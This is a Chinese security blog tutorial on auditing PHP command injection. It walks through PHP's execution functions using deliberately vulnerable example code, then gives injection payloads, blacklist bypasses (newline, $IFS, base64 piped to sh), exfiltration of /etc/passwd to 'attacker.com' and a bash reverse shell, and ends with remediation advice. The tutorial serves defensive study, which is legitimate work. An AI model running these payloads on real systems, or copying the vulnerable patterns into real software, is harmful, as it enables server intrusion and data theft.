#  [代码审计] php 命令执行  
 Pik安全实验室   2026-05-18 08:31  
  
0x00 介绍  
  
命令执行（Command Injection）是指攻击者通过在应用程序的输入点注入系统命令，在服务器上执行任意操作系统指令。PHP 中命令执行通常发生在程序将用户可控的参数传递给系统命令执行函数时。与 SQL 注入不同，命令执行直接作用于操作系统层面，危害更大——从读取敏感文件到反弹 shell，攻击面极广。  
  
0x01 命令执行函数  
  
system()  
  
system() 执行外部程序并显示输出。它会将命令执行的最后一行结果直接输出到页面。  
  
// system() 示例            
  
$cmd = $_GET['cmd'];            
  
system($cmd);            
  
  
// 攻击: ?cmd=whoami            
  
// 输出: www-data  
  
exec()  
  
exec() 执行外部程序，返回命令输出的最后一行，不直接显示。通常需要配合 echo 等输出函数使用。  
  
// exec() 示例            
  
$cmd = $_GET['cmd'];            
  
exec($cmd, $output);            
  
var_dump($output);            
  
  
// 攻击: ?cmd=cat /etc/passwd  
  
shell_exec()  
  
shell_exec() 通过 shell 执行命令，将完整的输出作为字符串返回。注意需要手动 echo 才能输出到页面。  
  
// shell_exec() 示例            
  
$cmd = $_GET['cmd'];            
  
echo shell_exec($cmd);            
  
  
// 攻击: ?cmd=ls -la /var/www/html  
  
passthru()  
  
passthru() 执行外部程序并直接显示原始输出。与 system() 类似，但输出未经处理。常用于需要输出二进制数据的场景。  
  
// passthru() 示例            
  
$cmd = $_GET['ip'];            
  
passthru("ping -c 1 " . $cmd);            
  
  
// 攻击: ?ip=127.0.0.1;id  
  
popen()  
  
popen() 打开一个指向进程的管道，可多次读取输出。与前面的函数不同，它返回的是文件指针，适合处理大量输出。  
  
// popen() 示例            
  
$handle = popen($_GET['cmd'], 'r');            
  
while(!feof($handle)) {            
  
      
echo fread($handle, 1024);            
  
}            
  
pclose($handle);  
  
proc_open()  
  
proc_open() 是功能最强大的进程执行函数，可以同时控制 stdin/stdout/stderr 三个管道。攻击者常用它来建立交互式 shell。  
  
// proc_open() 示例            
  
$descriptorspec = array(            
  
      
0 => array('pipe', 'r'),            
  
      
1 => array('pipe', 'w'),            
  
      
2 => array('pipe', 'w')            
  
);            
  
$process = proc_open($_GET['cmd'], $descriptorspec, $pipes);            
  
if (is_resource($process)) {            
  
      
echo stream_get_contents($pipes[1]);            
  
      
fclose($pipes[1]);            
  
      
proc_close($process);            
  
}  
  
反引号 ``  
  
PHP 中的反引号（backtick）等价于 shell_exec()。注意它只能捕获 stdout，不包含 stderr。如需捕获错误输出，加 2>&1 重定向。  
  
// 反引号示例            
  
$cmd = $_GET['cmd'];            
  
echo `{$cmd}`;            
  
  
// 攻击: ?cmd=cat /etc/shadow 2>&1  
  
pcntl_exec()  
  
pcntl_exec() 在当前进程空间执行指定程序，执行后当前 PHP 进程被完全替换，不会返回。需要 pcntl 扩展，CLI 模式下常见。  
  
0x02 示例  
  
示例 1：ping 命令拼接  
  
先思考一下代码中的限制条件是什么：  
  
header('Content-type: text/html;charset=utf-8');            
  
if (isset($_POST['submit'])) {            
  
      
$ip = $_POST['ip'];            
  
      
$cmd = "ping -c 3 " . $ip;            
  
      
echo '  
```
```  
  
';     
  
}     
  
?>     
  
  
      
  
      
  
  
代码没有做任何输入过滤，直接拼接传入 system()。攻击 payload：  
  
127.0.0.1; id            
  
127.0.0.1 | whoami            
  
127.0.0.1 && cat /etc/passwd            
  
127.0.0.1 || ls -la /            
  
127.0.0.1 `id`  
  
示例 2：黑名单过滤绕过  
  
有些程序会对输入做黑名单过滤。思考一下如何绕过：  
  
$ip = $_POST['ip'];            
  
$blacklist = array(';', '|', '&', '`', '$', '(', ')');            
  
$ip = str_replace($blacklist, '', $ip);            
  
system("ping -c 1 " . $ip);            
  
?>  
  
绕过方式：换行符 %0a 不在黑名单中，可直接利用。$IFS 可替代空格，base64 可绕过关键词检测。  
  
// %0a 换行绕过（URL 编码后）            
  
127.0.0.1%0aid            
  
  
// 不带空格的绕过（$IFS 是 shell 内部字段分隔符）            
  
127.0.0.1%0acat$IFS/etc/passwd            
  
  
// base64 编码后执行            
  
127.0.0.1%0aecho$IFS"Y2F0IC9ldGMvcGFzc3dk"|base64$IFS-d|sh  
  
示例 3：escapeshellcmd 与 escapeshellarg  
  
escapeshellcmd 转义整条命令中的特殊字符，但空格和 %0a 不被转义，仍可参数注入。escapeshellarg 更安全，给参数加单引号并转义。  
  
// escapeshellcmd() — 空格 %0a 不会被转义！            
  
$cmd = escapeshellcmd("ping -c 1 " . $_GET['ip']);            
  
system($cmd);            
  
  
// escapeshellarg() — 更安全            
  
$ip = escapeshellarg($_GET['ip']);            
  
system("ping -c 1 " . $ip);  
  
示例 4：无回显的命令执行  
  
当命令执行结果不直接显示在页面时，需要用带外方式获取：  
  
// DNS 外带            
  
nslookup $(whoami).attacker.com            
  
  
// HTTP 外带            
  
curl http://attacker.com/$(cat /etc/passwd|base64)            
  
  
// 反弹 shell            
  
bash -i >& /dev/tcp/attacker.com/4444 0>&1            
  
  
// 写 webshell            
  
echo "" > /var/www/html/shell.php  
  
0x03 修复方案  
  
1. 白名单验证  
  
对输入做严格的白名单校验，不要依赖黑名单。  
  
// 如果是 IP 地址，用 filter_var 验证            
  
$ip = $_POST['ip'];            
  
if (filter_var($ip, FILTER_VALIDATE_IP)) {            
  
      
system("ping -c 3 " . escapeshellarg($ip));            
  
} else {            
  
      
die("Invalid IP");            
  
}  
  
2. 禁用危险函数  
  
在 php.ini 的 disable_functions 中添加高危函数：  
  
disable_functions = system,exec,shell_exec,passthru,popen,            
  
                      
proc_open,pcntl_exec,pclose  
  
3. 最小权限 + 容器隔离  
  
Web 服务以最低权限运行（如 www-data），使用 chroot 或 Docker 容器隔离，限制 PHP 可访问的文件系统。不要给 Web 用户 sudo 权限。  
  
本文仅作安全研究与学习用途，用于非法行为后果自行承担。  
  
